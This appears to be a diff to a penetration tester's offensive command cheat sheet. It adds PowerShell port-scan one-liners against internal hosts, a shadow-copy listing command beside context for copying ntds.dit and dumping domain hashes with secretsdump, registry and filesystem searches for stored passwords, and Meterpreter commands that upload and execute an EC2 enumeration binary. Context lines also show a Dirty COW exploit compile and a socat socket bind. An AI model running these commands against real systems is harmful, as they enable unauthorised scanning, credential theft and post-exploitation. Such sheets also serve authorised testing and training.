@@ -660,6 +660,11 @@ powershell -noprofile -noninteractive -command "[System.Net.ServicePointManager]
 #for large files... watch them
 tcpdump -vnni tap0 tcp port 80
 
+powershell -noprofile -noninteractive -command "1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"
+powershell -noprofile -noninteractive -command "21..23 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.75""",$_)) """Port $_ is open!"""} 2>$null"
+powershell -noprofile -noninteractive -command "22 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"
+powershell -noprofile -noninteractive -command "3306 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"
+
 
 ###################################
 #### FTP DOWNLOAD            ######
@@ -992,6 +997,7 @@ python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -sy
 ###################################
 dir C:\Windows\NTDS\ntds.dit
 vssadmin create shadow /for=C:
+vssadmin list shadows
 Successfully created shadow copy for 'C:\'
     Shadow Copy ID: {d1fcd10a-a64b-42f6-877e-632ccb62e6d8}
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
@@ -1035,6 +1041,10 @@ findstr /si password *.xml *.ini *.txt
 
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s 
+dir registry::
+forfiles /P C:\ /S /D +12/07/2013
+findstr /C:"searchstring" /S C:\* 2>nul
+findstr /C:searchstring /S C:\* 2>nul
 
 ###################################
 #### WINDOWS ENUM SCRIPT     ######
@@ -1800,6 +1810,13 @@ gcc -pthread 40839.c -o dirty -lcrypt
 #connect a binary to a socket
 socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./executable
 
+#############################
+##### EC2 ENUM Meterpreter ##
+#############################
+spool /tmp/ec2out.txt
+sessions -C "upload win64_ec2_enum.exe"
+sessions -C "execute -f C:\\\\Windows\\\\System32\\\\win64_ec2_enum.exe -i"
+spool off
 
 #############################
 #####   OBJDUMP      ########
